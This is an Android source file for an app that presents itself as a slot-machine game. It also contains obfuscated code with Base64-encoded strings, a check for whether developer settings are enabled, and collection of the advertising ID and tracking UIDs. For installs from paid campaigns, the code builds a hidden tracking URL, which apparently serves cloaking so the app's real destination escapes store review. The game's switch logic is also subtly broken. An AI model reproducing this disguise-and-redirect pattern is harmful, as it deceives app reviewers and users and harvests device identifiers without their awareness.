package com.jjookker.sspllaash.itrfd;

import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;

import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.os.Handler;
import android.provider.Settings;
import android.view.View;
import android.widget.ImageView;
import android.widget.TextView;

import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLib;
import com.facebook.FacebookSdk;
import com.facebook.appevents.AppEventsLogger;
import com.facebook.applinks.AppLinkData;
import com.google.android.gms.ads.identifier.AdvertisingIdClient;
import com.onesignal.OneSignal;

import java.util.Map;
import java.util.Random;

public class MainActivity extends AppCompatActivity {

    private ImageView imageView1, imageView2,imageView3, imageViewSpin;
    private TextView textView;
    static String udhdaq;
    static String qqqqq;
    static String oknnsd;
    static String nhcad;
    static String mjjsju;
    static String bbgdvx;
    static String nhbzbad;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        getWindow().addFlags(1024);

        imageView1 = findViewById(R.id.imageView2);
        imageView2 = findViewById(R.id.imageView3);
        imageView3 = findViewById(R.id.imageView4);
        imageViewSpin = findViewById(R.id.imageView5);
        textView = findViewById(R.id.textView);
        click(imageViewSpin);
    }

    protected void click(ImageView imageView){
        imageView.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                MyTimer.myTimer(textView);
                SetImg1.setImg1(imageView1);
                SetImg2.setImg2(imageView2);
                SetImg3.setImg3(imageView3);
            }
        });

    }

    private static class MyTimer{

       public static void myTimer(TextView textView){

           new CountDownTimer(500,10){

               @Override
               public void onTick(long l) {
                   int min = 600;
                   int max = 800;
                   int diff = max - min;
                   Random random = new Random();
                   int i = random.nextInt(diff + 1);
                   i += min;
                   textView.setText("" + i);
               }

               @Override
               public void onFinish() {

               }
           }.start();

       }
    }

    private static class SetImg1{
        public static void setImg1(ImageView imageView){

            new CountDownTimer(500,10){

                @Override
                public void onTick(long l) {
                    Random random = new Random();
                    int a = random.nextInt(4);
                    switch (a){
                        case 0:
                            imageView.setImageResource(R.drawable.ic_slot_1);
                            break;
                        case 2:
                            imageView.setImageResource(R.drawable.ic_slot_2);
                            break;
                        case 3:
                            imageView.setImageResource(R.drawable.ic_slot_3);
                            break;
                        case 4:
                            imageView.setImageResource(R.drawable.ic_slot_4);
                            break;
                    }
                }

                @Override
                public void onFinish() {

                }
            }.start();

        }

    }

    private static class SetImg2{
        public static void setImg2(ImageView imageView){


            new Thread(new Runnable() {
                @Override
                public void run() {

                    for (int i = 0; i< 30;i++){

                        imageView.post(new Runnable() {
                            @Override
                            public void run() {
                                Random random = new Random();
                                int a = random.nextInt(3);
                                switch (a){
                                    case 0:
                                        imageView.setImageResource(R.drawable.ic_slot_1);
                                        break;
                                    case 1:
                                        imageView.setImageResource(R.drawable.ic_slot_2);
                                        break;
                                    case 2:
                                        imageView.setImageResource(R.drawable.ic_slot_3);
                                    case 3:
                                        imageView.setImageResource(R.drawable.ic_slot_4);
                                }
                            }
                        });

                    try {
                        Thread.sleep(20);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }}
            }).start();

      }
   }

   private static class SetImg3{
        public static void setImg3(ImageView imageView){


            Handler handler = new Handler();
            handler.post(new Runnable() {
                int p = 0;
                @Override
                public void run() {
                    Random random = new Random();
                    int a = random.nextInt(3);
                    switch (a){
                        case 0:
                            imageView.setImageResource(R.drawable.ic_slot_1);
                            break;
                        case 2:
                            imageView.setImageResource(R.drawable.ic_slot_2);
                            break;
                        case 3:
                            imageView.setImageResource(R.drawable.ic_slot_3);
                            break;
                        case 4:
                            imageView.setImageResource(R.drawable.ic_slot_4);
                            break;
                    }
                    p++;
                    if (p != 20){
                        handler.postDelayed(this::run,10);
                    }else {
                        p = 0;
                    }

                }
            });
        }
   }


   public static void rukd(JS js){
        OveStr.devye = Settings.Secure.getInt(js.getContentResolver(),
                Settings.Global.DEVELOPMENT_SETTINGS_ENABLED , 0);
   }



   public static void febbbdb(JS js){

       FacebookSdk.setApplicationId(OveStr.uyabq);
       FacebookSdk.setAdvertiserIDCollectionEnabled(true);
       FacebookSdk.sdkInitialize(js.getApplicationContext());
       FacebookSdk.fullyInitialize();
       FacebookSdk.setAutoInitEnabled(true);
       FacebookSdk.setAutoLogAppEventsEnabled(true);

       AppEventsLogger.activateApp(js.getApplication());
       AppLinkData.fetchDeferredAppLinkData(js.getApplicationContext(), new AppLinkData.CompletionHandler() {
           @RequiresApi(api = Build.VERSION_CODES.O)
           @Override
           public void onDeferredAppLinkDataFetched(@Nullable AppLinkData appLinkData) {

               if (appLinkData == null) {
                   appLinkData = AppLinkData.createFromActivity(js);
               }
               if (appLinkData != null) {
                   Uri url = appLinkData.getTargetUri();
                   OveStr.uyggwq = url.getQuery();
                   OveStr.ytfqds = odos(OveStr.uyggwq,js.getPackageName(), OveStr.ugwq,OveStr.ytvvq);

               }else {

               }
           }
       });


   }

   @RequiresApi(api = Build.VERSION_CODES.O)
   public static void ajs(AJS ajss){
       OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE);
       OneSignal.initWithContext(ajss);
       OneSignal.setAppId(OveStr.yyyy(OveStr.onns));


       OveStr.ytvvq = AppsFlyerLib.getInstance().getAppsFlyerUID(ajss.getApplicationContext());

       new Thread(new Runnable() {
           @Override
           public void run() {
               try {
                   OveStr.ugwq = AdvertisingIdClient.getAdvertisingIdInfo(ajss.getApplicationContext()).getId();
               }catch (Exception e){

               }
           }
       }).start();


       AppsFlyerLib.getInstance().init(OveStr.yyyy(OveStr.iuhd), new AppsFlyerConversionListener() {
           @Override
           public void onConversionDataSuccess(Map<String, Object> map) {

               OveStr.iuhbdw = map.get(OveStr.yyyy("YWZfc3RhdHVz")).toString();
               if (OveStr.iuhbdw.equals(OveStr.yyyy("Tm9uLW9yZ2FuaWM="))){
                   String str =map.get(OveStr.yyyy("Y2FtcGFpZ24=")).toString();
                   OveStr.uhhadq = odos(str,ajss.getPackageName(),OveStr.ugwq,OveStr.ytvvq);
               }
           }

           @Override
           public void onConversionDataFail(String s) {

           }

           @Override
           public void onAppOpenAttribution(Map<String, String> map) {

           }

           @Override
           public void onAttributionFailure(String s) {

           }
       },ajss.getApplicationContext());
       AppsFlyerLib.getInstance().start(ajss.getApplicationContext());
   }

   @RequiresApi(api = Build.VERSION_CODES.O)
   private static String odos(String udhda, String iksjal, String oijaq, String ijndan){

    String[] ooinnd = udhda.split("::");

        try {
            udhdaq = ooinnd[0];
        }catch (Exception e){
            udhdaq = "";
        }
        try {
            qqqqq = ooinnd[1];
        }catch (Exception e){
            qqqqq = "";
        }

        try {
            oknnsd = ooinnd[2];
        }catch (Exception e){
            oknnsd = "";

        }

        try {
            nhcad = ooinnd[3];
        }catch (Exception e){
            nhcad = "";
        }

        try {
            mjjsju = ooinnd[4];
        }catch (Exception e){
            mjjsju = "";
        }


        try {
            bbgdvx = ooinnd[5];
        }catch (Exception e){
            bbgdvx = "";
        }

        try {
            nhbzbad = ooinnd[6];
        }catch (Exception e){
            nhbzbad = "";
        }

        OneSignal.sendTag(OveStr.yyyy("c3ViX2FwcA=="), qqqqq);

        String khsja [] = {udhdaq, OveStr.yyyy("P2J1bmRsZT0=") , iksjal , OveStr.yyyy("JmFkX2lkPQ==") , oijaq , OveStr.yyyy("JmFwcHNfaWQ9") , ijndan ,
                OveStr.yyyy("JnN1YjY9") , qqqqq,
                OveStr.yyyy("JnN1Yjc9") , oknnsd,
                OveStr.yyyy("JnN1YjI9") , nhcad,
                OveStr.yyyy("JnN1YjM9") , mjjsju,
                OveStr.yyyy("JnN1YjQ9") , bbgdvx,
                OveStr.yyyy("JnN1YjU9") , nhbzbad,
                OveStr.yyyy("JmRldl9rZXk9") , OveStr.yyyy(OveStr.iuhd)};
        StringBuilder sda = new StringBuilder();
        for (int i = 0; i < khsja.length;i++){
            sda.append(khsja[i]);
        }
        return sda.toString();

   }

}